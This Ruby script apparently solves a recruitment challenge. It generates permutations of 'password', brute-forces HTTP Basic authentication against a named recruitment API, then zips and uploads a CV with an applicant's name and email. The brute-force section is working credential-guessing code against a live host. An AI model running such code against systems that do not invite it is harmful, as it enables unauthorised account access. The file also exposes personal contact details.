require 'net/http'
require 'uri'
require 'base64'
require 'json'
require 'zip'
require 'set'

# ===== CONFIGURATION =====
USERNAME = "John"
YOUR_NAME     = "Tendai"
YOUR_SURNAME  = "Nyandoro"
YOUR_EMAIL    = "tnyandoro@gmail.com"
CV_PATH       = "cv.pdf"

TARGET_AUTH_URL = "https://recruitment.warpdevelopment.co.za/v2/api/authenticate"

# Validate URL has no accidental whitespace
if TARGET_AUTH_URL != TARGET_AUTH_URL.strip
  raise "FATAL: TARGET_AUTH_URL contains leading/trailing whitespace!"
end

REQUEST_DELAY = 0.15

# PASSWORD GENERATOR
def generate_password_permutations(base = "password")
  substitutions = {
    'a' => ['a', 'A', '@'],
    's' => ['s', 'S', '5'],
    'o' => ['o', 'O', '0']
  }

  results = Set.new
  chars = base.chars
  permute(chars, 0, [], substitutions, results)
  results.to_a
end

def permute(chars, index, current, subs, results)
  if index == chars.length
    results.add(current.join)
    return
  end

  char_lower = chars[index].downcase
  options = subs[char_lower] || [char_lower, char_lower.upcase]

  options.each do |opt|
    permute(chars, index + 1, current + [opt], subs, results)
  end
end

# AUTHENTICATION BRUTE-FORCE

def attempt_authentication(password)
  uri = URI(TARGET_AUTH_URL)
  max_retries = 3
  retry_count = 0

  begin
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = true
    http.open_timeout = 10
    http.read_timeout = 10

    req = Net::HTTP::Get.new(uri)
    token = Base64.strict_encode64("#{USERNAME}:#{password}")
    req['Authorization'] = "Basic #{token}"
    req['User-Agent'] = 'Ruby-BruteForce/1.0'

    response = http.request(req)
    return [response.code.to_i, response.body]

  rescue SocketError, Errno::ECONNREFUSED, Timeout::Error => e
    retry_count += 1
    if retry_count <= max_retries
      puts "\n Network error (#{e.class}): #{e.message}. Retrying (#{retry_count}/#{max_retries})..."
      sleep(2 ** retry_count)
      retry
    else
      puts "\n Persistent network failure. Check your internet connection."
      raise
    end
  end
end

def brute_force_auth(dictionary)
  puts "Trying #{dictionary.length} password variants..."
  dictionary.each_with_index do |pwd, i|
    print "\r[#{i+1}/#{dictionary.length}] Testing: #{pwd.ljust(20)}"
    status, body = attempt_authentication(pwd)

    if status == 200
      puts "\n SUCCESS! Password is: '#{pwd}'"
      begin
        json = JSON.parse(body)
        url = json['url'] || json['temporaryUrl'] || json.values.first
        return url.to_s if url.is_a?(String)
      rescue JSON::ParserError
        raw_url = body.strip
        if raw_url.start_with?("http")
          puts " Detected plain-text URL in response."
          return raw_url
        else
          puts " 200 OK but unrecognized response: #{body}"
          return nil
        end
      end
    elsif status == 429
      puts "\n RATE LIMITED (429). Stopping to avoid penalty."
      exit 1
    end

    sleep(REQUEST_DELAY)
  end
  nil
end

# ZIP & UPLOAD — COMPATIBLE WITH ALL RUBYZIP VERSIONS

def create_submission_zip
  zip_path = "submission.zip"
  File.delete(zip_path) if File.exist?(zip_path)

  zip_data = Zip::OutputStream.write_buffer do |zip|
    
    unless File.exist?(CV_PATH)
      raise "Missing CV: #{CV_PATH}. Please add your cv.pdf!"
    end
    zip.put_next_entry("cv.pdf")
    zip.write(File.binread(CV_PATH))
    
    zip.put_next_entry("solver.rb")
    zip.write(File.read(__FILE__))
    
    zip.put_next_entry("dict.txt")
    zip.write(File.read("dict.txt"))
    
    zip.put_next_entry("IMPLEMENTATION_NOTE.txt")
    zip.write("Warp Development Challenge Submission\nTendai Nyandoro\nRuby Console Application\n#{Time.now}")
  end.string

  File.binwrite(zip_path, zip_data)
  
  size = File.size(zip_path)
  if size > 5 * 1024 * 1024
    raise "ZIP too large (#{size} bytes). Max allowed: 5MB."
  end

  puts "ZIP created (#{size} bytes): submission.zip"
  Base64.strict_encode64(zip_data)
end

def upload_cv(temp_url, b64_data)
  
  temp_url = temp_url.strip.gsub(/\s+/, '')
  puts "Uploading to: #{temp_url}"
  
  uri = URI(temp_url)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true
  http.open_timeout = 10
  http.read_timeout = 30

  payload = {
    "data" => b64_data,
    "name" => YOUR_NAME,
    "surname" => YOUR_SURNAME,
    "email" => YOUR_EMAIL
  }.to_json

  req = Net::HTTP::Post.new(uri)
  req['Content-Type'] = 'application/json'
  req['User-Agent'] = 'Ruby-Uploader/1.0'
  req.body = payload

  puts "Uploading to temporary URL..."
  res = http.request(req)

  if res.code == "200"
    puts "SUCCESS! Submission accepted."
    puts "Response: #{res.body}"
  elsif res.code == "429"
    puts "UPLOAD RATE LIMITED. Wait 5 min + 15 min penalty per attempt."
    puts "Details: #{res.body}"
  else
    puts "Upload failed (#{res.code}): #{res.body}"
  end
end


# MAIN EXECUTION

if __FILE__ == $0
  puts "Warp Development Recruitment Challenge Solver"
  puts "=" * 50

  puts "1. Generating password dictionary..."
  passwords = generate_password_permutations
  File.write("dict.txt", passwords.join("\n"))
  puts "   → Saved #{passwords.length} passwords to dict.txt"
  
  # Show some sample passwords
  puts "   → Sample passwords: #{passwords.first(5).join(', ')}..."

  puts "\n2. Attempting authentication as '#{USERNAME}'..."
  temp_url = brute_force_auth(passwords)

  if temp_url.nil? || temp_url.empty?
    puts "Failed to authenticate. Double-check network or logic."
    exit 1
  end

  puts "   → Got upload URL: #{temp_url}"

  puts "\n3. Creating and uploading submission package..."
  begin
    b64_zip = create_submission_zip
    upload_cv(temp_url, b64_zip)
  rescue => e
    puts "Error: #{e.message}"
    puts "Backtrace:"
    puts e.backtrace.first(5)
    exit 1
  end

  puts "\n All done! Good luck with your application, #{YOUR_NAME}!"
end